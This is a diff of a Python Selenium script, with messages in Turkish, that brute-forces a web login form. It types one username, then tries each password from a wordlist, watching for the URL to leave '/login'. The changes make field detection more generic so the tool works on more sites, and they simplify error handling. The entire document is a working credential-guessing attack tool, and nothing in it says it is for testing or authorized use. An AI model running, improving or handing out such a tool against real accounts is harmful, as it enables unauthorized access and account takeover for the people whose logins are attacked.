@@ -2,7 +2,7 @@ import argparse
 import sys
 import time
 from selenium import webdriver
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.firefox.service import Service as FirefoxService
 from selenium.webdriver.support.ui import WebDriverWait
@@ -29,7 +29,6 @@ def main():
         print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
         sys.exit(1)
 
-    # Selenium WebDriver'ı başlat
     service = None
     driver = None
     try:
@@ -40,7 +39,6 @@ def main():
         print("Lütfen Firefox tarayıcısının sisteminizde kurulu olduğundan emin olun.", file=sys.stderr)
         sys.exit(1)
 
-    # --- YENİ MANTIK: SAYFAYI BİR KEZ YÜKLE VE BEKLE ---
     try:
         driver.get(args.url)
         print("[*] Sayfa yüklendi. Başlangıç animasyonları için 30 saniye bekleniyor...")
@@ -51,28 +49,31 @@ def main():
         driver.quit()
         sys.exit(1)
 
-
     found_password = None
-    # Elementleri döngü dışında bir kez bulmayı deneyelim.
-    # Eğer sayfa yapısı sabitse bu daha hızlı çalışır.
     try:
-        USERNAME_SELECTOR = (By.CSS_SELECTOR, "input[placeholder='Kullanıcı Adı']")
-        PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[placeholder='Şifre']")
-        LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
-
-        wait = WebDriverWait(driver, 10)
-        username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
+        # --- YENİ VE DAHA AKILLI SEÇİCİ MANTIĞI ---
+        wait = WebDriverWait(driver, 15)
+        
+        # 1. Şifre alanını bul (en güvenilir olan)
+        PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
         password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
+        
+        # 2. Kullanıcı adı alanını bul (genellikle şifreden önceki input)
+        # XPath kullanarak şifre alanından önce gelen input'u buluyoruz.
+        USERNAME_SELECTOR = (By.XPATH, "//input[@type='password']/preceding::input[1]")
+        username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
+        
+        # 3. Giriş yap butonunu bul
+        LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
         login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
         
         username_field.send_keys(args.username)
 
     except TimeoutException:
-        print("\nHata: Giriş formundaki elementler (kullanıcı adı, şifre) bulunamadı.", file=sys.stderr)
-        print("Lütfen script içerisindeki 'USERNAME_SELECTOR' ve 'PASSWORD_SELECTOR' değerlerini kontrol edin.", file=sys.stderr)
+        print("\nHata: Giriş formundaki elementler bulunamadı.", file=sys.stderr)
+        print("Bu durum, sayfanın HTML yapısının beklenenden farklı olmasından kaynaklanabilir.", file=sys.stderr)
         driver.quit()
         sys.exit(1)
-
 
     for password in passwords:
         if found_password:
@@ -85,11 +86,8 @@ def main():
             password_field.send_keys(password)
             login_button.click()
             
-            # Başarılı girişten sonra URL'nin değişmesini bekleyelim.
-            # 3 saniye içinde URL'de "/login" ifadesi hala varsa, başarısız olduğunu varsay.
             WebDriverWait(driver, 3).until(lambda d: "/login" not in d.current_url)
             
-            # Eğer yukarıdaki bekleme TimeoutException fırlatmazsa, URL değişmiş demektir.
             current_url = driver.current_url
             print(f"\n[+] BAŞARILI! Şifre bulundu: {password}")
             print(f"    -> Yönlendirilen URL: {current_url}")
@@ -99,24 +97,10 @@ def main():
             break
 
         except TimeoutException:
-            # URL değişmedi, yani giriş başarısız. Bir sonraki şifreye geç.
             continue
         except Exception as e:
             print(f"\nBeklenmedik bir hata oluştu: {e}")
-            print("Sayfa yeniden yükleniyor ve devam ediliyor...")
-            driver.get(args.url)
-            time.sleep(5)
-            # Elementleri yeniden bulmamız gerekebilir.
-            try:
-                username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
-                password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
-                login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
-                username_field.clear()
-                username_field.send_keys(args.username)
-            except:
-                print("Elementler yeniden bulunamadı. Script durduruluyor.")
-                break
-
+            break
 
     if not found_password:
         print("\n[-] Şifre bulunamadı.")
